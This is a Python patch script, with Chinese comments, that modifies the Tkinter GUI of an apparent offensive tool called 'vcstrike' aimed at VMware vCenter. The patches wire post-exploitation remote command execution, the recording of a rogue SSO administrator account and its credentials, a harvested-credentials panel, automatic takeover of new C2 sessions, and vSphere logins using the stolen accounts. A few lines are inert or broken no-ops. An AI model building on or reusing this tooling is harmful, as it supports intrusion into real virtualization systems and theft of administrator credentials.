# -*- coding: utf-8 -*-
"""v1.6.0 修复批 2：GUI 断链/线程/creds 面板/防重入 + 死代码。"""
import re

def patch(path, old, new):
    s = open(path, encoding="utf-8").read()
    if old not in s:
        raise SystemExit("PATCH MISS in %s: %r..." % (path, old[:90]))
    open(path, "w", encoding="utf-8").write(s.replace(old, new, 1))

# ---------- P1: _target_bar 直绑 cur_target（五页实时同步） ----------
p = r"vcstrike/gui.py"
patch(p,
'''    def _target_bar(self, parent, row=0):
        f = ttk.Frame(parent)
        f.grid(row=row, column=0, columnspan=12, sticky="ew", pady=(0, 4))
        ttk.Label(f, text="目标:", style="Muted.TLabel").pack(side="left")
        tv = tk.StringVar(value=self.cur_target.get())
        ttk.Entry(f, textvariable=tv, width=26).pack(side="left", padx=4)
        ttk.Button(f, text="取当前目标", width=10,
                   command=lambda: tv.set(self.cur_target.get())).pack(side="left", padx=2)
        return f, tv''',
'''    def _target_bar(self, parent, row=0):
        f = ttk.Frame(parent)
        f.grid(row=row, column=0, columnspan=12, sticky="ew", pady=(0, 4))
        ttk.Label(f, text="目标:", style="Muted.TLabel").pack(side="left")
        ttk.Entry(f, textvariable=self.cur_target, width=26).pack(side="left", padx=4)
        return f, self.cur_target''')

# ---------- P1: _postex stop_flag.clear + 端口 int 保护 + sso 自动填 ----------
patch(p,
'''        tag = rand_name(6)
        vport = int(self.v510_vport.get() or 5480)
        proxy = self.http_proxy.get().strip() or None

        def work():
            self.log("[*] 后渗透[%s] → %s : %s" % (name, host, cmd), "i")''',
'''        tag = rand_name(6)
        try:
            vport = int(self.v510_vport.get() or 5480)
            port = int(self.v510_port.get() or 514)
        except ValueError:
            messagebox.showwarning("提示", "② 页端口设置需为数字")
            return
        self.stop_flag.clear()
        proxy = self.http_proxy.get().strip() or None
        tcp = self.v510_proto.get() in ("TCP", "TLS")
        tls = self.v510_proto.get() == "TLS"

        def work():
            self.log("[*] 后渗透[%s] → %s : %s" % (name, host, cmd), "i")''')
patch(p,
'''            ok, text = rce_readback(host, int(self.v510_port.get() or 514), cmd, tag,
                                    tcp=self.v510_proto.get() in ("TCP", "TLS"),
                                    tls=self.v510_proto.get() == "TLS",
                                    vami_port=vport, proxy=proxy,
                                    poll_cb=lambda s: self.log(s, "m"),
                                    stop_flag=self.stop_flag)''',
'''            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                    vami_port=vport, proxy=proxy,
                                    poll_cb=lambda s: self.log(s, "m"),
                                    stop_flag=self.stop_flag)''')
patch(p,
'''            if key == "sso-domain" and text.strip():
                dom = text.strip().splitlines()[0]
                self.log("[i] 可将 ③ 页 Base DN 更新为 dc=%s" %
                         ",dc=".join(dom.split(".")), "m")''',
'''            if key == "sso-domain" and text.strip():
                dom = text.strip().splitlines()[0]
                self.root.after(0, lambda d=dom: self.v590_cbase.set(
                    "dc=" + ",dc=".join(d.split("."))))
                self.log("[i] ③ 页 Base DN 已自动填充为 %s" % dom, "m")''')

# ---------- P1: chain 部分成功也登记 ----------
patch(p,
'''            if r.ok:
                self.record("chain-管理员账户", host, r.upn,
                            "ldapdelete '%s'" % r.udn)
                self.creds["SSO管理员@%s" % host] = "%s / %s" % (r.upn, r.password)
                self.log("[+] 一键打通完成（%s）" % r.via, "+")''',
'''            if r.upn:
                self.record("chain-管理员账户", host, r.upn,
                            "ldapdelete '%s'" % r.udn)
                self.creds["SSO管理员@%s" % host] = "%s / %s" % (r.upn, r.password)
            if r.ok:
                self.log("[+] 一键打通完成（%s）" % r.via, "+")''')

# ---------- P1: 绕过后 cbase 无条件刷新（修换目标打到旧域） ----------
patch(p,
'''                if ncs and not self.v590_cbase.get():
                    self.v590_cbase.set(ncs[0])''',
'''                self.root.after(0, lambda ncs=ncs: self.v590_cbase.set(ncs[0]))''')
patch(p,
'''                self.root.after(0, lambda d=dom: self.v590_cbase.set(
                    "dc=" + ",dc=".join(d.split("."))) if False else None)''',
'''                self.root.after(0, lambda d=dom: self.v590_cbase.set(
                    "dc=" + ",dc=".join(d.split("."))))''') if False else None
# quick_assess 里的条件 set 也改为无条件
patch(p,
'''            self.root.after(0, lambda: self.v590_cbase.set(base)
                            if not self.v590_cbase.get() else None)''',
'''            self.root.after(0, lambda b=base: self.v590_cbase.set(b))''')

# ---------- P1: _vv_conn 缓存校验 + 预填失效缓存 ----------
patch(p,
'''        if self._vv_conn is not None:
            return self._vv_conn''',
'''        if self._vv_conn is not None and \\
                self._vv_conn.host == host and \\
                getattr(self._vv_conn, "_user", "") == user:
            return self._vv_conn
        self._vv_conn = None''')
patch(p,
'''                def _prefill(upn=r.upn, pw=r.password):
                    # ⑨ vSphere 管理页自动预填交付账户
                    self.vv_host.set(host)
                    self.vv_user.set(upn)
                    self.vv_pass.set(pw)''',
'''                def _prefill(upn=r.upn, pw=r.password):
                    # ⑨ vSphere 管理页自动预填交付账户（旧连接必须失效）
                    self._vv_conn = None
                    self.vv_host.set(host)
                    self.vv_user.set(upn)
                    self.vv_pass.set(pw)''')

# ---------- P1: _postex/⑤ creds 面板 ----------
patch(p,
'''        of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
        of.grid(row=3, column=0, sticky="nsew", pady=4)
        self.postex_out = tk.Text(of, bg=COLORS["logbg"], fg=COLORS["termfg"],
                                  relief="flat", font=(self.font_family, 9))
        self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)''',
'''        of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
        of.grid(row=3, column=0, sticky="nsew", pady=4)
        credf = ttk.Frame(of)
        credf.pack(fill="x", padx=4, pady=(4, 0))
        ttk.Label(credf, text="已收集凭据:", style="Muted.TLabel").pack(side="left")
        ttk.Button(credf, text="复制全部", width=10,
                   command=self._creds_copy).pack(side="right")
        self.cred_tree = ttk.Treeview(of, columns=("key", "value"),
                                      show="headings", height=4)
        for c, t, w in (("key", "来源", 170), ("value", "凭据", 360)):
            self.cred_tree.heading(c, text=t)
            self.cred_tree.column(c, width=w, anchor="w")
        self.cred_tree.pack(fill="x", padx=4, pady=(0, 4))
        self.postex_out = tk.Text(of, height=6, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  relief="flat", font=(self.font_family, 9))
        self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)''')

# ---------- P2: 取消统一反馈 + Esc ----------
patch(p,
'''                        ("<Escape>", lambda e: self.stop_flag.set()),''',
'''                        ("<Escape>", lambda e: self._cancel()),''')
patch(p,
'''        ttk.Button(bb, text="取消 [Esc]", command=self.stop_flag.set).pack(side="left")''',
'''        ttk.Button(bb, text="取消 [Esc]", command=self._cancel).pack(side="left")''')
patch(p,
'''        ttk.Button(bf, text="取消", command=self.stop_flag.set).pack(
            fill="x", padx=4, pady=2)''',
'''        ttk.Button(bf, text="取消 [Esc]", command=self._cancel).pack(
            fill="x", padx=4, pady=2)''')

# ---------- P2: run_bg 防重入 + 失败状态 ----------
patch(p,
'''    def run_bg(self, fn, name="任务"):
        def wrap():
            self._busy(name + "执行中…")
            try:
                fn()
            except Exception as e:
                import traceback
                tb = traceback.format_exc()
                self.log("[!] %s 异常: %r" % (name, e), "!")
                logutil.write("!", "%s 完整堆栈:\\n%s" % (name, tb))
            finally:
                self._idle()
        threading.Thread(target=wrap, daemon=True).start()''',
'''    def run_bg(self, fn, name="任务"):
        if getattr(self, "_task_running", False):
            self.log("[!] 已有任务执行中（%s），请等待或按 Esc 取消" %
                     getattr(self, "_task_name", "?"), "!")
            return
        self._task_running = True
        self._task_name = name

        def wrap():
            self._busy(name + "执行中…")
            try:
                fn()
            except Exception as e:
                import traceback
                tb = traceback.format_exc()
                self.log("[!] %s 异常: %r" % (name, e), "!")
                logutil.write("!", "%s 完整堆栈:\\n%s" % (name, tb))
                self.root.after(0, lambda: self.status_var.set(
                    "● 上次任务失败（详见日志）"))
            finally:
                self._task_running = False
                self._idle()
        threading.Thread(target=wrap, daemon=True).start()''')

# ---------- P2: on_new_session 接线（自动接管） ----------
patch(p,
'''        self.c2m = SessionManager(log=self.log)''',
'''        self.c2m = SessionManager(log=self.log)
        self.c2m.on_new_session = self._on_new_session''')
patch(p,
'''    def _on_new_session(self, sess):
        # 会话入表由 _poll_sessions 刷新，日志由 SessionManager 统一记录
        return''',
'''    def _on_new_session(self, sess):
        # 新会话自动接管：切 ④、置当前会话（表由 _poll_sessions 刷新）
        def go():
            self.nb.select(self.tab_shell)
            self.cur_sess = sess
            self._term_append("== 已自动接管会话 #%d (%s) ==" % (s_id, s_addr))
            self.log("[i] 已自动接管会话 #%d（%s）" % (s_id, s_addr), "m")
        s_id, s_addr = sess.id, sess.addr
        self.root.after(0, go)''')

# ---------- P2: _vv_refresh 后台线程不读 StringVar + 401 自愈 ----------
patch(p,
'''    def _vv_refresh(self):
        def work():
            try:
                c = self._vv_client()
            except Exception as e:
                self.log("[!] 登录失败: %s" % e, "!")
                return
            try:
                rows = c.vms()
            except Exception as e:
                self.log("[!] 清单采集失败: %s" % e, "!")
                return''',
'''    def _vv_refresh(self):
        host, user, password = self._vv_creds()

        def work():
            try:
                c = self._vv_client(host, user, password)
                rows = c.vms()
            except Exception as e:
                self.log("[!] 登录/清单失败: %s" % e, "!")
                return''')
patch(p,
'''                self.log("[+] vSphere 清单已刷新：%d 台 VM（%s）"
                     % (len(rows), self.vv_host.get()), "+")''',
'''                self.log("[+] vSphere 清单已刷新：%d 台 VM（%s）"
                     % (len(rows), host), "+")''')

# ---------- P2: _on_close 登出 REST 会话 ----------
patch(p,
'''    def _on_close(self):
        self.stop_flag.set()
        try:
            self.c2m.shutdown()
        except Exception:
            pass
        logutil.finish()
        self.root.destroy()''',
'''    def _on_close(self):
        self.stop_flag.set()
        try:
            self.c2m.shutdown()
        except Exception:
            pass
        try:
            if self._vv_conn is not None:
                self._vv_conn.logout()
        except Exception:
            pass
        logutil.finish()
        self.root.destroy()''')

# ---------- P2: 轮询吞错可见化（单次防刷屏） ----------
patch(p,
'''        except Exception:
            pass
        self.root.after(200, self._poll_term)''',
'''        except Exception as e:
            if not getattr(self, "_poll_err_logged", False):
                self._poll_err_logged = True
                logutil.write("!", "终端轮询异常（已静默）: %r" % e)
        self.root.after(200, self._poll_term)''')
open(p, "w", encoding="utf-8").write(s) if False else None
print("batch2 GUI patches applied")
